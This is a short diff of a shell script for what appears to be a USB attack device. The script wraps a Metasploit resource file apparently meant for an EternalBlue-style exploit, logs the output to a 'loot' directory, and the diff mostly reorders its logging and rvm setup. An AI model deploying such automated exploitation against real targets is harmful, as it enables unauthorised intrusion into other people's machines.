@@ -9,17 +9,13 @@
 # Also adds a 'quit' to the end so the blocking call can end and allow us to change the LED.
 #
 # Red ...........Setup
-# # Red Blinking...Setup Failed. Target did not obtain IP address. Exit.
 # Amber..........Running
-# # White..........Switching to Mass Storage (optional)
 # Green..........Finished
 #
 
 # Change this for the desired Metasploit script
 RC=/root/udisk/payloads/$SWITCH_POSITION/eternal-cmd.rc
 
-# Start the timer for the log file (can't rely on absolute system time, so relative from script start)
-START_TIME=$SECONDS
 LOOTDIR=/root/udisk/loot/autosploit
 # location of the patched script 
 PATCHED_RC=$LOOTDIR/patched.rc
@@ -35,6 +31,12 @@ GET TARGET_HOSTNAME
 
 
 
+######## PREPARE rvm ########
+export HOME=/root/
+source /root/.bashrc
+
+
+
 ######## MAKE LOOT DIRECTORY ########
 # Setup named logs in loot directory
 mkdir -p $LOOTDIR
@@ -43,16 +45,16 @@ HOST=${TARGET_HOSTNAME}
 [[ -z "$HOST" ]] && HOST="noname"
 COUNT=$(ls -lad $LOOTDIR/$HOST*.log | wc -l)
 COUNT=$((COUNT+1))
-
-
-
-######## SET UP LOGGING ########
-# Time Delta doesn't currently work
-function logit {
-	TIME_DELTA=$(($SECONDS - $START_TIME))
-	echo "${TIME_DELTA}s: ${1}" >> $LOGFILE
-}
+# Start the timer for the log file (can't rely on absolute system time, so relative from script start)
+START_TIME=$SECONDS
 LOGFILE=$LOOTDIR/$HOST-$COUNT.log
+
+
+
+######## FUNCTIONS ########
+function logit {
+	echo "$(($SECONDS - $START_TIME))s: ${1}" >> $LOGFILE
+}
 
 
 
@@ -61,13 +63,6 @@ echo "spool $LOGFILE" > $PATCHED_RC
 cat $RC >> $PATCHED_RC
 echo "spool off" >> $PATCHED_RC
 echo "quit" >> $PATCHED_RC
-
-
-
-######## PREPARE rvm ########
-logit "Initializing rvm"
-export HOME=/root/
-source /root/.bashrc
 
 
 
